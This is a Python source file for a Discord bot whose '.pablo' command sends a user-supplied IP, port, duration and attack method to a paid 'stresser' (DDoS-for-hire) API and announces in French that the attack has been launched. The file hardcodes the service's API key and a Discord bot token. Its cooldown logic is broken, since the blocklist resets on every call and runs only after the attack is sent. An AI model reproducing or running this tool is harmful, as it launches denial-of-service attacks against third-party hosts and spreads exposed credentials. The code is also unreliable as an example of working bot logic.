import requests
import discord
from discord.ext import commands	
import discord
import webbrowser
import pyautogui
import asyncio
import datetime

bot = commands.Bot(command_prefix='.', intents=discord.Intents.all())

@bot.command()
async def pablo(ctx, ip: str, port: str, time: str, methods: str):
    url = f"https://stresser.website/hub/api/api.php?key=o9806un7zud2pb79k1ixd0w66fcw1e&host={ip}&port={port}&time={time}&method={methods}"
    params = {'ip': ip, 'port': port, 'time': time, 'methods': methods}
    response = requests.get(url)
    await ctx.send(f'attack à {ip} avec le port {port} pendant {time} avec la methods {methods} à bien était lancée')
    webbrowser.open(url)
    blocked_users = {}
    if ctx.message.author.id in blocked_users:
        if datetime.datetime.now() < blocked_users[ctx.message.author.id]:
            remaining_time = (blocked_users[ctx.message.author.id] - datetime.datetime.now()).total_seconds()
            await ctx.send(f"Vous êtes bloqué pour encore {int(remaining_time)} secondes.")
            return
        else:
            del blocked_users[ctx.message.author.id]
    role = "CUSTOMER"
    if role in [r.name for r in ctx.message.author.roles]:
        blocked_users[ctx.message.author.id] = datetime.datetime.now() + datetime.timedelta(seconds=time)
        await ctx.send(f"Vous avez été bloqué pendant {time} secondes.")
    else:
        # code pour exécuter la commande .pablo
        pass 




  
#=====Bot Command=====#    

bot.run("MTA2NDYzNjQ5MjM1NTQ3NzYyNQ.Gugxi1.8p336yRe5bnh6q8zcYXx7-tb5h2tivCf5UuavQ")



import asyncio

